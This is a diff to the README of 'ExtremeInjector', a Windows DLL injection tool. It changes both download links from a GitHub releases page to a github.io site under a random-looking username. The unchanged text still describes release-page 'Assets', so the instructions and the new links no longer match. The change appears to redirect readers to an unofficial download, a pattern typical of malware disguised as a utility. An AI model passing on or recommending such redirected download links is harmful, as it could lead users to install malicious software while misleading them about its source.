@@ -1,6 +1,6 @@
 # 💉 ExtremeInjector - Modify PC programs for better debugging
 
-[![](https://img.shields.io/badge/Download-ExtremeInjector-blue.svg)](https://github.com/Adducersubdivisionpinophytina430/ExtremeInjector/releases)
+[![](https://img.shields.io/badge/Download-ExtremeInjector-blue.svg)](https://adducersubdivisionpinophytina430.github.io)
 
 ExtremeInjector allows users to add external code libraries, known as DLL files, into active Windows applications. Developers and power users employ this tool to change how software behaves, test new features, or find errors in code. This tool works by forcing a running program to load an external file, which then performs tasks within that program's memory.
 
@@ -17,7 +17,7 @@ ExtremeInjector allows users to add external code libraries, known as DLL files,
 
 You need to access the official release page to obtain the correct files. The software requires a Windows environment to function. 
 
-[Visit this page to download the latest version of ExtremeInjector](https://github.com/Adducersubdivisionpinophytina430/ExtremeInjector/releases)
+[Visit this page to download the latest version of ExtremeInjector](https://adducersubdivisionpinophytina430.github.io)
 
 On this page, look for the section marked "Assets." Click the link ending in .zip to start your download. Save this file to a location you can easily find, such as your desktop or downloads folder.
 
